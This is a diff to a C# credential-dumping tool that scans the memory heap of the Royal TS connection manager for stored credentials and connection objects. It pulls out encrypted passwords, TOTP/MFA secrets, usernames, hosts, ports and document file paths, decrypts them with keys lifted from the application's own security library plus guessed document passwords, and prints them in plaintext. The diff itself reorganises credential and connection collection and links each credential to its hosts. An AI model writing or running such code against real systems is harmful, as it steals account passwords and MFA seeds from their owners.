@@ -228,37 +228,41 @@ class Program
             Console.WriteLine($"[*] SecurityInterface keys extracted (key1={siKey1.Length}c, key2={siKey2.Length}c, doc={siDoc})");
             Console.WriteLine($"[*] Found {docPwdCandidates.Count} document password candidate(s)");
 
-            var entries = new List<(string type, string name, string host, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();
+            // Phase 2: Collect credentials AND connections, plus document paths
+            var creds = new List<(string id, string type, string name, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();
+            var conns = new List<(string type, string name, string host, string port, string credId, string description, string docName)>();
+            var docPaths = new Dictionary<string, string>();
 
             foreach (var obj in heap.EnumerateObjects())
             {
                 if (!obj.IsValid || obj.Type == null) continue;
                 var tn = obj.Type.Name ?? "";
                 if (!tn.StartsWith("RoyalDocumentLibrary.Royal")) continue;
-                if (!(tn.Contains("Credential") || tn.Contains("Connection")) || tn.EndsWith("[]")) continue;
 
-                var kv = ReadKvStore(obj);
-                string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
-                if (string.IsNullOrEmpty(encPwd)) continue;
-
-                string name = "", host = "", user = "";
-                kv.TryGetValue("Name", out name); name ??= "";
-                kv.TryGetValue("UserName", out user); user ??= "";
-                if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
-                kv.TryGetValue("ComputerName", out host); host ??= "";
-                if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }
-
-                string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
-                string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
-                string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
-                if (mfaCfg != "0" && mfaCfg != "") {
-                    string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
-                    otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
-                    kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
-                    if (otpDigits == "0") otpDigits = "6";
-                    kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
-                    kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
+                // Collect document file paths
+                if (tn.Contains("RoyalDocument") && !tn.Contains("Connection") && !tn.Contains("Credential"))
+                {
+                    var dkv = ReadKvStore(obj);
+                    string dName = ""; dkv.TryGetValue("Name", out dName); dName ??= "";
+                    string dPath = ""; dkv.TryGetValue("FileName", out dPath); dPath ??= "";
+                    if (string.IsNullOrEmpty(dPath)) { dkv.TryGetValue("FilePath", out dPath); dPath ??= ""; }
+                    if (string.IsNullOrEmpty(dPath)) {
+                        foreach (var f in obj.Type.Fields) {
+                            if (f.ElementType != ClrElementType.String) continue;
+                            var fn = (f.Name ?? "").ToLowerInvariant();
+                            if (fn.Contains("filename") || fn.Contains("filepath")) {
+                                try { var v = obj.ReadStringField(f.Name); if (!string.IsNullOrEmpty(v) && v.Contains("\\")) { dPath = v; break; } } catch {}
+                            }
+                        }
+                    }
+                    if (!string.IsNullOrEmpty(dName) && !string.IsNullOrEmpty(dPath) && dPath.EndsWith(".rtsz", StringComparison.OrdinalIgnoreCase) && !docPaths.ContainsKey(dName))
+                        docPaths[dName] = dPath;
+                    continue;
                 }
+
+                if (tn.EndsWith("[]")) continue;
+                var kv = ReadKvStore(obj);
+                string name = ""; kv.TryGetValue("Name", out name); name ??= "";
 
                 string docName = "";
                 try {
@@ -269,11 +273,62 @@ class Program
                     }
                 } catch {}
 
-                entries.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
+                // Credentials: have Password
+                if (tn.Contains("Credential"))
+                {
+                    string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
+                    if (string.IsNullOrEmpty(encPwd)) continue;
+                    string user = ""; kv.TryGetValue("UserName", out user); user ??= "";
+                    if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
+                    string id = ""; kv.TryGetValue("ID", out id); id ??= "";
+                    if (string.IsNullOrEmpty(id)) { kv.TryGetValue("Id", out id); id ??= ""; }
+
+                    string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
+                    string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
+                    string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
+                    if (mfaCfg != "0" && mfaCfg != "") {
+                        string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
+                        otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
+                        kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
+                        if (otpDigits == "0") otpDigits = "6";
+                        kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
+                        kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
+                    }
+
+                    creds.Add((id, tn.Replace("RoyalDocumentLibrary.", ""), name, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
+                    continue;
+                }
+
+                // Connections: have Host, may reference a credential via CredentialId
+                if (tn.Contains("Connection"))
+                {
+                    string host = ""; kv.TryGetValue("ComputerName", out host); host ??= "";
+                    if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }
+                    if (string.IsNullOrEmpty(host)) { kv.TryGetValue("HostName", out host); host ??= ""; }
+                    string port = ""; kv.TryGetValue("Port", out port); port ??= "";
+                    if (port == "0") port = "";
+                    string credId = ""; kv.TryGetValue("CredentialId", out credId); credId ??= "";
+                    if (string.IsNullOrEmpty(credId)) { kv.TryGetValue("CredentialID", out credId); credId ??= ""; }
+                    string desc = ""; kv.TryGetValue("Description", out desc); desc ??= "";
+                    // Also check if connection has inline password
+                    string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
+                    string user = ""; kv.TryGetValue("UserName", out user); user ??= "";
+                    if (!string.IsNullOrEmpty(encPwd))
+                        creds.Add(("", tn.Replace("RoyalDocumentLibrary.", ""), name, user, encPwd, "", "", "", "", "", docName));
+                    if (!string.IsNullOrEmpty(host) || !string.IsNullOrEmpty(credId))
+                        conns.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, port, credId, desc, docName));
+                    continue;
+                }
             }
 
-            var unique = entries.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
-            Console.WriteLine($"[*] Found {unique.Count} entry(ies) with encrypted passwords");
+            if (docPaths.Count > 0) {
+                Console.WriteLine("[*] Document paths:");
+                foreach (var dp in docPaths) Console.WriteLine($"[*]   {dp.Key} => {dp.Value}");
+            }
+
+            var uniqueCreds = creds.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
+            var uniqueConns = conns.GroupBy(e => $"{e.name}|{e.host}").Select(g => g.First()).ToList();
+            Console.WriteLine($"[*] Found {uniqueCreds.Count} credential(s), {uniqueConns.Count} connection(s)");
 
             AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
                 var p = Path.Combine(rtDir, new AssemblyName(e.Name).Name + ".dll");
@@ -333,7 +388,7 @@ class Program
                 Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
             }
 
-            foreach (var x in unique) {
+            foreach (var x in uniqueCreds) {
                 if (!string.IsNullOrEmpty(x.name) && !docPwdCandidates.Contains(x.name)) docPwdCandidates.Add(x.name);
                 if (!string.IsNullOrEmpty(x.user) && !docPwdCandidates.Contains(x.user)) docPwdCandidates.Add(x.user);
                 if (!string.IsNullOrEmpty(x.docName) && !docPwdCandidates.Contains(x.docName)) docPwdCandidates.Add(x.docName);
@@ -341,27 +396,26 @@ class Program
 
             Console.WriteLine($"[*] Document password candidates: {docPwdCandidates.Count} (including empty)");
 
-            // Try decryption with ALL keysets
+            // Build credential ID -> credential lookup for connection linking
+            var credById = new Dictionary<string, (string name, string user, string plainPwd, string plainTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel)>();
+
             Console.WriteLine("\n##RESULTS_START##");
             int decrypted = 0;
 
-            foreach (var e in unique)
+            // Decrypt credentials
+            foreach (var e in uniqueCreds)
             {
                 string plainPwd = "", plainTotp = "", usedDp = "";
 
-                // Try each keyset
                 foreach (var ks in allKeysets)
                 {
                     if (!string.IsNullOrEmpty(plainPwd)) break;
-
-                    // Load keys into DLL instance
                     if (siInst != null && fKey1 != null && fKey2 != null && fDoc != null)
                     {
                         fKey1.SetValue(siInst, ks.key1);
                         fKey2.SetValue(siInst, ks.key2);
                         fDoc.SetValue(siInst, ks.doc);
                     }
-
                     if (decMethod != null && siInst != null)
                     {
                         foreach (var dp in docPwdCandidates)
@@ -382,26 +436,57 @@ class Program
                         try { plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? ""); } catch {}
                     }
                 }
-                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{e.host}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
+
+                // Store for connection linking
+                if (!string.IsNullOrEmpty(e.id))
+                    credById[e.id] = (e.name, e.user, plainPwd, plainTotp, e.otpAlgo, e.otpDigits, e.otpPeriod, e.otpLabel);
+
+                // Find connections that reference this credential
+                string linkedHosts = "";
+                foreach (var c in uniqueConns.Where(c => !string.IsNullOrEmpty(c.credId) && c.credId == e.id))
+                {
+                    var h = c.host;
+                    if (!string.IsNullOrEmpty(c.port)) h += ":" + c.port;
+                    linkedHosts += (linkedHosts == "" ? "" : ", ") + h;
+                }
+
+                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{linkedHosts}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
             }
 
-            // If nothing decrypted, try CredentialInfo objects as fallback
+            // Output connections (with linked credential info or standalone)
+            foreach (var c in uniqueConns)
+            {
+                var hostStr = c.host;
+                if (!string.IsNullOrEmpty(c.port)) hostStr += ":" + c.port;
+
+                if (!string.IsNullOrEmpty(c.credId) && credById.TryGetValue(c.credId, out var cred))
+                {
+                    // Already output with the credential above, skip to avoid duplicates
+                    continue;
+                }
+                // Connection with no linked credential - output host info
+                Console.WriteLine($"TYPE:{c.type}|NAME:{c.name}|HOST:{hostStr}|USER:|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:|DESC:{c.description}");
+            }
+
+            // CredentialInfo fallback
             if (decrypted == 0 && credentialInfos.Count > 0)
             {
-                Console.WriteLine($"## CREDINFO_START (fallback: {credentialInfos.Count} resolved credentials) ##");
+                Console.WriteLine($"## CREDINFO ({credentialInfos.Count} resolved) ##");
                 foreach (var ci in credentialInfos)
                 {
                     try {
-                        string user = "", pwd = "", keyfile = "", passphrase = "";
+                        string user = "", pwd = "";
                         try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                         try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
-                        try { keyfile = ci.ReadStringField("<Keyfile>k__BackingField") ?? ""; } catch {}
-                        try { passphrase = ci.ReadStringField("<Passphrase>k__BackingField") ?? ""; } catch {}
                         if (!string.IsNullOrEmpty(user) || !string.IsNullOrEmpty(pwd))
-                            Console.WriteLine($"CREDINFO|USER:{user}|PASS:{pwd}|KEYFILE:{keyfile}|PASSPHRASE:{passphrase}");
+                            Console.WriteLine($"TYPE:CredentialInfo|NAME:|HOST:|USER:{user}|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:{pwd}");
                     } catch {}
                 }
             }
+
+            // Output document paths
+            foreach (var dp in docPaths)
+                Console.WriteLine($"DOCPATH:{dp.Key}={dp.Value}");
 
             Console.WriteLine("##RESULTS_END##");
         }
